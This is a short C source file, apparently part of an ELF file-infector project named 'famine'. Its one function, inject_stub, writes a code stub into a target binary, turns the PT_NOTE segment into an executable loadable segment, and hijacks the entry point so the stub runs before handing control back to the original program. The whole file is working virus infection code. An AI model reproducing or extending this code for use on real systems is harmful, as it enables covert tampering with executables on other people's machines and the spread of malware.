#include "../include/famine.h"

/*
* @brief Copy the stub to its page-aligned offset, patch its two runtime values,
* turn the PT_NOTE segment into a loadable exectuable segment that maps it,
* and point the entry at the stub. The stub jumps back to the saved e_entry.
*/
void	inject_stub(t_famine *f, const unsigned char *stub, size_t stub_len, size_t placeholders_offset)
{
	memcpy(f->out + f->stub_offset, stub, stub_len);

	struct placeholders *placeholders = f->out + f->stub_offset+ placeholders_offset;
	placeholders->entry = f->ehdr->e_entry;
	placeholders->phdr = f->phdr_vaddr;
#if CREATE_STUB
#else
	placeholders->stub_len = stub_len;
#endif
	LOG("entry: %zx == \n", f->ehdr->e_entry);
	LOG("phdr: %zx\n", f->phdr_vaddr);
	LOG("stub_len: %zx\n", stub_len);

	f->note->p_type = PT_LOAD;
	f->note->p_flags = PF_R | PF_X;
	f->note->p_offset = f->stub_offset;
	f->note->p_vaddr = f->stub_vaddr;
	f->note->p_paddr = f->stub_vaddr;
	f->note->p_filesz = stub_len;
	f->note->p_memsz = stub_len;
	f->note->p_align = PAGE_SIZE;

	f->ehdr->e_entry = f->stub_vaddr;
}

